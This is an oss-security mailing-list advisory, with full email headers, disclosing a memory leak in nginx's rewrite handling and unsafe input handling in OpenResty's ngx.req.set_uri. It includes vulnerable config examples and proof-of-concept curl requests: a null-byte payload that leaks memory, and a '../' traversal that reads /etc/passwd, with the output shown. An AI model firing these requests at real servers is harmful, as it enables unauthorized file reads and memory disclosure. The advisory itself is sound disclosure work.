X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4996" "Wednesday" "18" "March" "2020" "16:10:32" "+0300" "Vladimir Dubrovin" "vlad@securityvulns.ru" "<c429fb15-5af8-e56f-01ec-674b10ec3e7b@securityvulns.ru>" "163" "[oss-security] Insecure implementation of OpenResty ngx.req.set_uri + memory content leak in nginx." nil nil nil "3" "2020031813:10:32" "[oss-security] Insecure implementation of OpenResty ngx.req.set_uri + memory content leak in nginx." (number mark "U       vlad@securit Mar 18  163/4996  " thread-indent "\"[oss-security] Insecure implementation of OpenResty ngx.req.set_uri + memory content leak in nginx.\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Insecure implementation of OpenResty ngx.req.set_uri + memory content leak in nginx." nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20260 invoked by uid 550); 18 Mar 2020 13:13:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19745 invoked from network); 18 Mar 2020 13:10:46 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=securityvulns.ru; s=mail;
	t=1584537034; bh=fFeLY1t4jeXiYr/tf9zvUZto7rK6iU7SnTuDgUpY1GQ=;
	h=Subject:To:From:Date:Message-ID;
	b=Yng/SQdOVTFumXeHiwz+DpqUiz37VlyMXS9EWn3849Qy1bflzd9IsvM2ZBdJyQHP+
	 bZc27GvIfCK+OyxINsPJpqAC8+jgtWuqfsLTMBxJvA7VCEMM6Oas+7+hO00QqnNbMn
	 JXF8Co2aZ16/4T76IJBZh7eKOe5UswZxEaTyAaA4=
Authentication-Results: mxback18j.mail.yandex.net; dkim=pass header.i=@securityvulns.ru
To: oss-security@lists.openwall.com
From: Vladimir Dubrovin <vlad@securityvulns.ru>
Autocrypt: addr=vlad@securityvulns.ru; prefer-encrypt=mutual; keydata=
 mQINBFW3+N0BEACfaMX3QIFIA4GI5uDp+HZ9eJmObtf6HCu7Y6RhZVzqcC09UQiXylkLqxq6
 LZnU9dNMAPn0p0dEq3WA+zqDccWy5SJqK3YejvuvtDQ6gWhpB2SQo3J7AcoqzTFbI2Ib1Egr
 RL8iZXmLSbX7WlJwPKAcEuCcOYXoecLek2Sifr3JpDPzDTyZwMHUN+arjRXyiWAcoiJyM1fw
 KNk/HbX94180RiIbDThqLi6eYM5/KZCCzlGpS5Qwxub8Rs2qvnU30sMRxAMIkt65vg5CAeZ0
 FeMEXMnyf0jHQAW67dQGzhRAUWhwHmNToOrOAnT8I4Nt+BHDOY/4N1Qtd34U5tYav1h4iCul
 V1LbBGv73YjmPiTWpBJnFemxwNP2AyULBbg1PxIvYHHbbINwp9ojNrn6Xm+8yWRPVNBW2GFc
 8soUJ22mt4q2K2gi0RFZDOTXr1sKjxU1djq2GbkQ1H+FYKqTqO63vxFx9b+hjOT0+OmBH9gs
 NIlaSC8s+rDLlth9rgv5yo057nCZcinesjgMa8Xpy3PJ0wA1B2jx4kMbhYYEuMHx4JL+SlbW
 /d9G8EEvSwxZ5kQOBQPE1u+inyOCwVNsCyKAhWEuek1XSrAj7Goj2di904q3p6QBiJx9SgMp
 o2dgtxVXPRxuEh5kYwm5ndqkdaHDis/Hm0HkoCrgUHIrICDerwARAQABtCQzcHJveHkgRGV2
 ZWxvcGVycyA8M3Byb3h5QDNwcm94eS5ydT6JAj8EEwEIACkFAlW3+N0CGyMFCQlmAYAHCwkI
 BwMCAQYVCAIJCgsEFgIDAQIeAQIXgAAKCRBg0LrPasdTqUcYD/wK+aEtVBbDdHDkNQsZCqvP
 +Zyt9Me33Y+Dv7yAvTXn1wbKCad4JAcoZwVWN/LU8e8GV2V/rnzE3m57rhaXcnqmxS794zj5
 6ls3LWUK4OidK/m95hiky7qVfkLwnlLFVsnA8OPBKiZ1DZI5qdgdC6gDqZSF84FHQuyzQzid
 7vYH/nHIZrcqtDUGXurySgrYDwQDOTYU4AQ4nRxF7+jCKhFAEBWKYha8hTrjbkBVx/uF2OZC
 cECJf47nmd+ah8EWR8joNDeBG9cgQ24gGLvZOMCzn/GRnvi4Cm7/MpwXPfUQAFrDwshB2vjo
 n4c1isXzUbKWx0nzDPKG8HcGj+GwBjUNv3Jyd5rx/HSY646rkhpyr1KGOsZ3XNEv3cdvp5zi
 J8qU6cHpaYAFal4JPR5I4qV/lbaOxUCnoSGksBjVUwjy+MmN7RSk2lmd6kXfSHrVy2NS4QJj
 YIsVP17hW3jAHyojfpoP4jTMmn3ilZsrCFwbjd2IpLK0I0XSkwPJYIH/6DulIRCqp84CBcNP
 Gi7VD3D/kHTyi/5ClVTXG3oDEqgwKqS5jjxWuBiUg9pw4QCwVwReqougfiqE7+YCVvWkv5D6
 cwWLKFfLX7+oT7sOsoL7MbGrmSBf0miJUW4wMEqoexZzn5aQ6Q8xmBN/d1EWMYfBF+qPsaTs
 +WKcKaNgji4VjbkCDQRVt/jdARAA1rmuqWcH4bt2r0TbVipBRRB3eZBHBNChGpiACaBPvMDh
 4X49AJbyBgC/x7LuNVwJmIvjrb0Hou02UX+Y2qN7VMU+2pggOwEivQuele/87RKTT0+Rg+2l
 c1f2/Yjq7fSkVVupOsq4QdywvP4sONX9HtN/4R/nTSC47xQ4SoLr9RCSTJvgrzJ7r+T33EaL
 2ayFOY9zUvfj/YfL6KpovnTBNGOJN7Q9PbwSOW4NGRWaewF3yo5mcDctbNM2EHCj9JCqvBby
 hxV5MBuPnyYp4ZH8XBuZKz+cDLwS4CYTyK+D9JEr+FREyntCO9d1yswLGVgw93IF/Qzd8wwh
 BrbcEyZyYIn8ENYw0ZAHa1WAVI0ENnlucSDLw1eboTHpzw/Sk3e/L+zGzzSLLwGncWgl4DYC
 m82cY++6j7X99Sb24/eoxQg7ykFZO7WGFzXLfpYo+M+Fl76D1vxqMtVYIpKQlSMvPNVVRTg5
 IqA0+2Xs/aXutd/fMqwVkgpdCnrZiy3y2Ebwhd0DPbI2ocqGVzTOn0EnQQdM77PiJpcNEsUs
 FfIr+mgQFxoTv/3sMLqpD3UhWsNSbzE7QFo2qLmVtaNqEgYQDJpPMEQaR9Hiy+mp8wJa8K/+
 r7eTlPuVDcFzkPD5ezS/BJvLECPmeRfj+aL/OuHuWe9nluGGAJ0qu4vxpj/zV8UAEQEAAYkC
 JQQYAQgADwUCVbf43QIbDAUJCWYBgAAKCRBg0LrPasdTqYtVD/0RSMPwehFP7TaeMdo5hZj6
 fAkNVUFJX6qC8RMrB01mGZG3fC9gjyF5RHB3VykdUWV5aNL3/X7y6iJ8iQFZenRlN+PIETyJ
 jUQWDKdOuJr97dSKxhp4jmlgbP2CLmeg7OQU6T8KRXqxZ4XvbIo25dQ8QSAcs/QrtW+srhVf
 BKHNTe8/FpswRX11M0bMBBAo5kyOMBg9jyJBlH7usDN/sbLwun055ckmLVGfgdAK23AvP3Da
 wm7H458bchuaDlMiSKU6Lbi1Vd+bsNsZmlBqmblj5ZyVZqoHJEorV+BysCQwWaxwTfe+acKV
 Ik5X8giz1ec7DSdTiXCd2mVA/cP28pT/XdgSGYt3BN/aYpoWTE34/UdPaupwVuEBnYgrVod7
 gxlM0lLu8AXi4x32VIGNeZTmcYSnK6RZY75pxr02N0Evrl9mKO8iUfgYF9f0Jgu0liO6MGU0
 KndwdxHJ/HXjh193OrO5bfGTGZVjOwfYG1RMbB8ssoui7e6XGrYAnjZd1dl4xs61LdNEp8FA
 NuNH2NmyT/hp10y726EN8wBuxugENIwUznGvT61UGiAZBu+hpQxaklILfOC2m78RVW3YfZJD
 9mxmwIy4d51AbTJzr2LbBZ2yupjFYMqxHRu7kI8N/4a09YGyThsq2vF1TLeLgSqhG6kodV5h
 Vh86iRvw8/zjYA==
Message-ID: <c429fb15-5af8-e56f-01ec-674b10ec3e7b@securityvulns.ru>
Date: Wed, 18 Mar 2020 16:10:32 +0300
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101
 Thunderbird/68.5.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
Content-Language: ru
Subject: [oss-security] Insecure implementation of OpenResty ngx.req.set_uri + memory content
 leak in nginx.

OpenResty is LUA engine for nginx reverse proxy.

Affected versions: tested on nginx-1.17.5 and openresty-1.15.8.2 on
ubuntu 18.04

Two independent problems were identified in OpenResty and nginx,
potentially leading to different security vulnerabilities: Header
injection/CRLF injection, directory traversal/local file read,
restrictions bypass, memory content disclosure in some nginx + openresty
configurations:

1. There is a bug in nginx "rewrite" implementation. It can disclose the
fragment of the process memory with 301/302 HTTP reply if rewrite string
contains ASCII 0 character. Within nginx itself rewrite string is a
static configuration option, and is not supposed to be manipulated
externally.

2. OpenResty implements ngx.req.set_uri() via raw rewrite in nginx
without any additional filtering or normalization. If used with
untrusted input it can lead to CRLF/header injection, directory
traversal/local file read, restrictions bypass. Due to (1) it can also
lead to memory content disclosure.


Fix:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

As of now, there is no fix for ngx.req.set_uri(), this function must be con=
sidered as potentially unsafe.

Recommendations:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Avoid usage of ngx.req.set_uri() with untrusted input or implement strict i=
nput filtering.


Timeline:

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

21.03.2019 - Memory content leak reported to Mail.Ru team via H1 by @maxarr=
 in https://hackerone.com/reports/513236
22.03.2019 - Memory content leak is mitigated on Mail.Ru side
05.11.2019 - Problem additionally researched by Denis 'KPEBETKA' Denisov an=
d Nikolay Ermishkin of Mail.Ru Security Team, root cause tracked to nginx+o=
penresty.
07.11.2019 - Reported to nginx team
08.11.2019 - Acknowledged by nginx team
13.12.2019 - nginx team reported back the issue is not tracked as a securit=
y bug in nginx, secure rewrite will not be provided by nginx API
16.12.2019 - memory leak bug fixed in nginx master branch
https://hg.nginx.org/nginx/rev/02a539522be4
https://github.com/nginx/nginx/commit/a5895eb502747f396d3901a948834cd87d5fb=
0c3#diff-75916b11f3e6d45e713a6aa9c97cf315
17.12.2019 - reported to OpenResty team
17.12.2019 - acknowledged by OpenResty team
18.03.2020 - disclosed


Details:

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

This configuration demonstrates memory content leak in nginx:

Vulnerable config (^@ is a null byte)

location ~ /memleak {
=C2=A0=C2=A0=C2=A0 rewrite ^.*$ "^@asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf=
asdasdf";
}

location / {
=C2=A0=C2=A0=C2=A0 root html;
=C2=A0=C2=A0=C2=A0 index index.html index.htm;
}

curl localhost:8337/memleak -vv
...
Location: http://localhost:8337/WjWj
...

WjWj =E2=80=93 is a random peace of memory, usual includes parts of other r=
equests

vulnerable code:

https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416=
d/src/http/modules/ngx_http_static_module.c#L77

last =3D ngx_http_map_uri_to_path(r, &path, &root, 0);

Doesn't handle location with null byte properly

https://github.com/nginx/nginx/blob/5a2ce3f4ee55eb8903aa9481deaaf402d5a2e80=
5/src/http/ngx_http_core_module.c#L1846

last =3D ngx_cpystrn(last, r->uri.data + alias, r->uri.len - alias + 1);

Writes only null byte to last, not the whole r->uri.data

https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416=
d/src/http/modules/ngx_http_static_module.c#L161

if (!clcf->alias && clcf->root_lengths =3D=3D NULL && r->args.len =3D=3D 0)=
 {

It's important to get into this conditional branch to get memory leak

https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416=
d/src/http/modules/ngx_http_static_module.c#L188

r->headers_out.location->value.len =3D len;

location length more than was really written, location ends with random
piece of memory (usually includes part of other HTTP requests).

Example of configuration vulnerable to=C2=A0 memory leak with
https://github.com/openresty/lua-nginx-module:

location ~ /memleak {
=C2=A0=C2=A0=C2=A0 rewrite_by_lua_block {
=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 ngx.req.read_body();
=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 local args, err =3D ngx.req.get_=
post_args();
=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 ngx.req.set_uri( args["url"], tr=
ue );
=C2=A0=C2=A0=C2=A0 }
}

location / {
=C2=A0=C2=A0=C2=A0 root html;
=C2=A0=C2=A0=C2=A0 index index.html index.htm;
}

curl localhost:8337 -d "url=3D%00asdfasdfasdfasdfasdfasdfasdfasdf" -vv
...
Location: http://localhost:8337/WjWj
...

Example of configuration vulnerable to directory traversal with
https://github.com/openresty/lua-nginx-module

location ~ /rewrite {
=C2=A0 =C2=A0 rewrite ^.*$ $arg_x;
}

location / {
=C2=A0 =C2=A0 root html;
=C2=A0 =C2=A0 index index.html index.htm;
}

curl localhost:8337/rewrite?x=3D/../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...


-- Vladimir Dubrovin


